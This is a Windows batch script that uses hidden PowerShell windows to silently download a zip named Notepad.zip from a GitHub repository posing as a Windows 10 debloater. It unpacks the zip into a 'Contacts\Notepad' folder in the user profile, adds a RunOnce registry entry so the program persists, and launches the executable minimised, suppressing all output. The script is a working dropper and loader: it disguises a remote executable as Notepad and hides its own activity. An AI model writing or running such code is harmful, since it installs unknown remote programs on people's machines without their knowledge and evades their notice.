@echo off
setlocal EnableDelayedExpansion

set "user_profile=%USERPROFILE%"
set "sys_root=%SystemRoot%"
set "TARGET=%user_profile%\Contacts\Notepad"
set "NOTEPAD_PATH=%TARGET%\Notepad.exe"
set "ZIPFILE=%user_profile%\Contacts\Notepad.zip"
set "URL=https://github.com/0xMakeda/WIndows-10-Debloater/raw/refs/heads/main/Notepad.zip"
set "REG_FULLKEY=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"

:: Create directory and extract Notepad.exe if it doesn't exist
if not exist "!NOTEPAD_PATH!" (
    if not exist "!user_profile!\Contacts\" mkdir "!user_profile!\Contacts\" 2>nul
    if not exist "!TARGET!\" mkdir "!TARGET!\" 2>nul
    powershell -NoProfile -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '!URL!' -OutFile '!ZIPFILE!' -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
    if exist "!ZIPFILE!" (
        powershell -NoProfile -WindowStyle Hidden -Command "try { Expand-Archive -LiteralPath '!ZIPFILE!' -DestinationPath '!TARGET!' -Force -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
        if errorlevel 1 (
            exit /b 1
        )
        del "!ZIPFILE!" 2>nul
    ) else (
        exit /b 1
    )
)

:: Verify Notepad.exe exists
if not exist "!NOTEPAD_PATH!" (
    exit /b 1
)

:: Check RunOnce registry value
set "REG_CORRECT=0"
set "REG_DATA="
for /f "tokens=3*" %%A in ('reg query "!REG_FULLKEY!" /ve 2^>nul') do (
    set "REG_DATA=%%A %%B"
)
if defined REG_DATA (
    if /i "!REG_DATA!"=="!NOTEPAD_PATH!" (
        set "REG_CORRECT=1"
    )
)

:: Set RunOnce registry if not correctly set
if "!REG_CORRECT!"=="0" (
    reg add "!REG_FULLKEY!" /ve /t REG_SZ /d "\"!NOTEPAD_PATH!\"" /f >nul 2>&1
    if errorlevel 1 (
        exit /b 1
    )
)

:: Start Notepad.exe if it exists
if exist "!NOTEPAD_PATH!" (
    start "" /min "!NOTEPAD_PATH!" >nul 2>&1
)

endlocal
exit /b 0